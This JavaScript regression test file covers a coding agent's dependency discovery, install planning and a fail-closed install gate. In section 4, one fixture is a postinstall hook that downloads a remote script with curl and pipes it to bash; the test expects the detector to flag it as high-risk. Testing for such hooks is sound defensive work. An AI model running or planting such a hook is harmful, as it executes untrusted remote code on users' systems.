import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs/promises';
import path from 'node:path';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const developerAgent = require('../electron/developerAgent.cjs');
const developerFiles = require('../electron/developerFiles.cjs');
const {
  SUPPORTED_ECOSYSTEMS,
  DEPENDENCY_STATUSES,
  PACKAGE_MANAGERS,
  inspectLifecycleScripts,
  inspectNodeDependencies,
  inspectPhpDependencies,
  inspectPythonDependencies,
  inspectGoDependencies,
  inspectRustDependencies,
  discoverDependencies,
  createDependencyPlan,
  executeDependencyPlan,
  verifyInstalledDependencies,
} = require('../electron/coding-pipeline/dependencyManager.cjs');

console.log('Starting Dynamic Dependency Discovery & Controlled Installation regression tests...');

const testRoot = await fs.mkdtemp(path.join(process.cwd(), '.coding-v2-test-'));

try {
  // =========================================================================
  // 1. Ecosystem Manifest & Package Manager Detection
  // =========================================================================
  console.log('Testing ecosystem manifest and package manager detection...');

  // A. npm (package.json + package-lock.json)
  const npmDir = path.join(testRoot, 'npm-project');
  await fs.mkdir(npmDir, { recursive: true });
  await fs.writeFile(
    path.join(npmDir, 'package.json'),
    JSON.stringify({
      name: 'npm-app',
      dependencies: { lodash: '^4.17.21' },
      devDependencies: { mocha: '^10.0.0' },
    }),
    'utf8'
  );
  await fs.writeFile(path.join(npmDir, 'package-lock.json'), '{}', 'utf8');

  const npmReport = await inspectNodeDependencies(npmDir);
  assert.equal(npmReport.hasManifest, true);
  assert.equal(npmReport.packageManager, PACKAGE_MANAGERS.NPM);
  assert.ok(npmReport.lockfiles.includes('package-lock.json'));
  assert.equal(npmReport.dependencies.length, 2);

  // B. pnpm (pnpm-lock.yaml)
  const pnpmDir = path.join(testRoot, 'pnpm-project');
  await fs.mkdir(pnpmDir, { recursive: true });
  await fs.writeFile(path.join(pnpmDir, 'package.json'), JSON.stringify({ name: 'pnpm-app' }), 'utf8');
  await fs.writeFile(path.join(pnpmDir, 'pnpm-lock.yaml'), 'lockfileVersion: 5.4', 'utf8');

  const pnpmReport = await inspectNodeDependencies(pnpmDir);
  assert.equal(pnpmReport.packageManager, PACKAGE_MANAGERS.PNPM);
  assert.ok(pnpmReport.lockfiles.includes('pnpm-lock.yaml'));

  // C. yarn (yarn.lock)
  const yarnDir = path.join(testRoot, 'yarn-project');
  await fs.mkdir(yarnDir, { recursive: true });
  await fs.writeFile(path.join(yarnDir, 'package.json'), JSON.stringify({ name: 'yarn-app' }), 'utf8');
  await fs.writeFile(path.join(yarnDir, 'yarn.lock'), '# yarn lockfile v1', 'utf8');

  const yarnReport = await inspectNodeDependencies(yarnDir);
  assert.equal(yarnReport.packageManager, PACKAGE_MANAGERS.YARN);
  assert.ok(yarnReport.lockfiles.includes('yarn.lock'));

  // D. Composer (composer.json + composer.lock)
  const composerDir = path.join(testRoot, 'composer-project');
  await fs.mkdir(composerDir, { recursive: true });
  await fs.writeFile(
    path.join(composerDir, 'composer.json'),
    JSON.stringify({
      name: 'vendor/app',
      require: { 'monolog/monolog': '^2.0' },
      'require-dev': { 'phpunit/phpunit': '^9.5' },
    }),
    'utf8'
  );
  await fs.writeFile(path.join(composerDir, 'composer.lock'), '{}', 'utf8');

  const composerReport = await inspectPhpDependencies(composerDir);
  assert.equal(composerReport.hasManifest, true);
  assert.equal(composerReport.packageManager, PACKAGE_MANAGERS.COMPOSER);
  assert.ok(composerReport.lockfiles.includes('composer.lock'));
  assert.equal(composerReport.dependencies.length, 2);

  // E. Python (pyproject.toml + poetry.lock)
  const pyDir = path.join(testRoot, 'python-project');
  await fs.mkdir(pyDir, { recursive: true });
  await fs.writeFile(
    path.join(pyDir, 'pyproject.toml'),
    `[tool.poetry]
name = "py-app"
version = "0.1.0"

[tool.poetry.dependencies]
python = "^3.10"
requests = "^2.28.0"
fastapi = "^0.95.0"
`,
    'utf8'
  );
  await fs.writeFile(path.join(pyDir, 'poetry.lock'), '# poetry lock', 'utf8');

  const pyReport = await inspectPythonDependencies(pyDir);
  assert.equal(pyReport.hasManifest, true);
  assert.equal(pyReport.packageManager, PACKAGE_MANAGERS.POETRY);
  assert.ok(pyReport.lockfiles.includes('poetry.lock'));
  assert.equal(pyReport.dependencies.length, 2);

  // F. Go (go.mod + go.sum)
  const goDir = path.join(testRoot, 'go-project');
  await fs.mkdir(goDir, { recursive: true });
  await fs.writeFile(
    path.join(goDir, 'go.mod'),
    `module example.com/goapp

go 1.21

require (
    github.com/gin-gonic/gin v1.9.1
)
`,
    'utf8'
  );
  await fs.writeFile(path.join(goDir, 'go.sum'), '', 'utf8');

  const goReport = await inspectGoDependencies(goDir);
  assert.equal(goReport.hasManifest, true);
  assert.equal(goReport.packageManager, PACKAGE_MANAGERS.GO);
  assert.ok(goReport.lockfiles.includes('go.sum'));
  assert.equal(goReport.dependencies.length, 1);

  // G. Rust (Cargo.toml + Cargo.lock)
  const rustDir = path.join(testRoot, 'rust-project');
  await fs.mkdir(rustDir, { recursive: true });
  await fs.writeFile(
    path.join(rustDir, 'Cargo.toml'),
    `[package]
name = "rustapp"
version = "0.1.0"

[dependencies]
serde = "1.0"
tokio = "1.0"
`,
    'utf8'
  );
  await fs.writeFile(path.join(rustDir, 'Cargo.lock'), '', 'utf8');

  const rustReport = await inspectRustDependencies(rustDir);
  assert.equal(rustReport.hasManifest, true);
  assert.equal(rustReport.packageManager, PACKAGE_MANAGERS.CARGO);
  assert.ok(rustReport.lockfiles.includes('Cargo.lock'));
  assert.equal(rustReport.dependencies.length, 2);

  // =========================================================================
  // 2. Monorepo / Workspaces Layout
  // =========================================================================
  console.log('Testing monorepo and workspace discovery...');

  const monorepoDir = path.join(testRoot, 'monorepo-project');
  await fs.mkdir(path.join(monorepoDir, 'packages', 'core'), { recursive: true });
  await fs.mkdir(path.join(monorepoDir, 'packages', 'ui'), { recursive: true });

  await fs.writeFile(
    path.join(monorepoDir, 'package.json'),
    JSON.stringify({
      name: 'monorepo-root',
      workspaces: ['packages/*'],
      devDependencies: { turbo: '^1.10.0' },
    }),
    'utf8'
  );
  await fs.writeFile(
    path.join(monorepoDir, 'packages', 'core', 'package.json'),
    JSON.stringify({
      name: '@mono/core',
      dependencies: { zod: '^3.20.0' },
    }),
    'utf8'
  );
  await fs.writeFile(
    path.join(monorepoDir, 'packages', 'ui', 'package.json'),
    JSON.stringify({
      name: '@mono/ui',
      dependencies: { react: '^18.2.0' },
    }),
    'utf8'
  );

  const monorepoDiscovery = await discoverDependencies(monorepoDir);
  assert.equal(monorepoDiscovery.reports.length, 3); // root + core + ui
  assert.equal(monorepoDiscovery.declaredCount, 3); // turbo + zod + react
  assert.equal(monorepoDiscovery.missingCount, 3); // none installed yet

  // =========================================================================
  // 3. Missing, Present, and Conflicting Dependencies
  // =========================================================================
  console.log('Testing installed vs missing vs version-mismatched dependencies...');

  const installedAppDir = path.join(testRoot, 'installed-app');
  const nodeModulesDir = path.join(installedAppDir, 'node_modules');
  await fs.mkdir(path.join(nodeModulesDir, 'lodash'), { recursive: true });
  await fs.mkdir(path.join(nodeModulesDir, 'axios'), { recursive: true });

  await fs.writeFile(
    path.join(installedAppDir, 'package.json'),
    JSON.stringify({
      name: 'installed-app',
      dependencies: {
        lodash: '^4.17.21', // will be INSTALLED
        axios: '^1.4.0',    // will have VERSION_MISMATCH (installed is 0.21.0)
        express: '^4.18.2', // will be MISSING
      },
    }),
    'utf8'
  );
  await fs.writeFile(path.join(installedAppDir, 'package-lock.json'), '{}', 'utf8');

  // lodash installed version 4.17.21
  await fs.writeFile(
    path.join(nodeModulesDir, 'lodash', 'package.json'),
    JSON.stringify({ name: 'lodash', version: '4.17.21' }),
    'utf8'
  );
  // axios installed version 0.21.0 (major version mismatch with ^1.4.0)
  await fs.writeFile(
    path.join(nodeModulesDir, 'axios', 'package.json'),
    JSON.stringify({ name: 'axios', version: '0.21.0' }),
    'utf8'
  );

  const installedReport = await inspectNodeDependencies(installedAppDir);
  const lodashItem = installedReport.dependencies.find((d) => d.name === 'lodash');
  assert.equal(lodashItem.status, DEPENDENCY_STATUSES.INSTALLED);
  assert.equal(lodashItem.installedVersion, '4.17.21');

  const axiosItem = installedReport.dependencies.find((d) => d.name === 'axios');
  assert.equal(axiosItem.status, DEPENDENCY_STATUSES.VERSION_MISMATCH);
  assert.equal(axiosItem.installedVersion, '0.21.0');

  const expressItem = installedReport.dependencies.find((d) => d.name === 'express');
  assert.equal(expressItem.status, DEPENDENCY_STATUSES.MISSING);
  assert.equal(expressItem.installedVersion, null);

  assert.equal(installedReport.missingDependencies.length, 1);
  assert.equal(installedReport.missingDependencies[0].name, 'express');

  // =========================================================================
  // 4. Lifecycle Scripts and Suspicious Side Effects Detection
  // =========================================================================
  console.log('Testing lifecycle scripts and side-effect detection...');

  const suspiciousScripts = {
    build: 'tsc',
    postinstall: 'curl -s https://untrusted-external-site.com/payload.sh | bash',
    preinstall: 'node scripts/preflight.js',
  };

  const detectedScripts = inspectLifecycleScripts(suspiciousScripts);
  assert.equal(detectedScripts.length, 2); // postinstall + preinstall

  const postinstallRisk = detectedScripts.find((s) => s.scriptName === 'postinstall');
  assert.equal(postinstallRisk.isSuspicious, true);
  assert.equal(postinstallRisk.riskLevel, 'HIGH');

  const preinstallNormal = detectedScripts.find((s) => s.scriptName === 'preinstall');
  assert.equal(preinstallNormal.isSuspicious, false);
  assert.equal(preinstallNormal.riskLevel, 'MEDIUM');

  // =========================================================================
  // 5. Minimal Installation Planning and Lockfile Preservation
  // =========================================================================
  console.log('Testing installation planning and lockfile preservation...');

  const planPnpm = createDependencyPlan({
    projectRoot: pnpmDir,
    dependencyReport: pnpmReport,
    targets: ['fastify'],
  });
  assert.equal(planPnpm.packageManager, PACKAGE_MANAGERS.PNPM);
  assert.equal(planPnpm.command, 'pnpm');
  assert.deepEqual(planPnpm.args, ['add', 'fastify']);
  assert.equal(planPnpm.networkRequired, true);
  assert.ok(planPnpm.planDigest.length === 64);

  const planYarn = createDependencyPlan({
    projectRoot: yarnDir,
    dependencyReport: yarnReport,
  });
  assert.equal(planYarn.packageManager, PACKAGE_MANAGERS.YARN);
  assert.equal(planYarn.command, 'yarn');
  assert.deepEqual(planYarn.args, ['install']);

  // =========================================================================
  // 6. Safe Execution Gate (Fails Closed While Process Isolation Unverified)
  // =========================================================================
  console.log('Testing safe execution gate (closed execution boundary)...');

  const ownerId = 99201;
  const originalRoots = process.env.AI_HELP_AGENT_CODING_PROJECT_ROOTS;
  process.env.AI_HELP_AGENT_CODING_PROJECT_ROOTS = testRoot;
  await developerFiles.attachProject(installedAppDir, ownerId);

  const sessionId = crypto.randomUUID();
  developerAgent.createSessionForBroker(ownerId, sessionId);

  const planInstalled = createDependencyPlan({
    projectRoot: installedAppDir,
    dependencyReport: await discoverDependencies(installedAppDir),
  });

  // Attempting execution fails closed safely
  const execResult = await executeDependencyPlan({
    plan: planInstalled,
    ownerWebContentsId: ownerId,
    sessionId,
  });

  assert.equal(execResult.ok, false);
  assert.equal(execResult.status, 'BLOCKED');
  assert.equal(execResult.executionBlocked, true);
  assert.equal(execResult.installed, false);
  assert.match(execResult.reason, /process isolation/i);

  // Verification confirms dependencies remain missing on disk
  const verifyResult = await verifyInstalledDependencies(installedAppDir);
  assert.equal(verifyResult.isFullyInstalled, false);
  assert.ok(verifyResult.missingCount > 0);

  // Unauthorized session fails closed
  const unauthExec = await executeDependencyPlan({
    plan: planInstalled,
    ownerWebContentsId: 99202, // unattached owner
    sessionId,
  });
  assert.equal(unauthExec.ok, false);
  assert.equal(unauthExec.status, 'UNAUTHORIZED');
  assert.equal(unauthExec.installed, false);

  // =========================================================================
  // 7. Workflow Integration via executeAutonomousCodingWorkflow
  // =========================================================================
  console.log('Testing workflow integration via executeAutonomousCodingWorkflow...');

  // A. Explicit install dependencies request is blocked safely
  const installWorkflow = await developerAgent.executeAutonomousCodingWorkflow({
    userRequest: 'Please install the missing dependencies',
    root: installedAppDir,
    sessionId,
    ownerWebContentsId: ownerId,
  });

  assert.equal(installWorkflow.outcome, 'BLOCKED');
  assert.equal(installWorkflow.phase, 'DEPENDENCY_INSTALL_GATE');
  assert.equal(installWorkflow.executionBlocked, true);
  assert.equal(installWorkflow.filesModified.length, 0);
  assert.ok(installWorkflow.dependencyPlan);
  assert.ok(installWorkflow.dependencyReport);

  // B. Read-only explanation request does NOT trigger installation gate
  const readOnlyWorkflow = await developerAgent.executeAutonomousCodingWorkflow({
    userRequest: 'Explain what dependencies this project uses',
    root: installedAppDir,
    sessionId,
    ownerWebContentsId: ownerId,
  });

  assert.equal(readOnlyWorkflow.outcome, 'COMPLETED');
  assert.equal(readOnlyWorkflow.phase, 'EXPLAIN');
  assert.equal(readOnlyWorkflow.filesModified.length, 0);
  assert.equal(readOnlyWorkflow.taskPlan.dependencyReport.declaredCount, 3);

  // Cleanup
  developerAgent.releaseSession(ownerId);
  developerFiles.releaseProject(ownerId);
  process.env.AI_HELP_AGENT_CODING_PROJECT_ROOTS = originalRoots;

  console.log('All Dynamic Dependency Discovery & Controlled Installation regression tests passed successfully!');
} finally {
  await fs.rm(testRoot, { recursive: true, force: true });
}
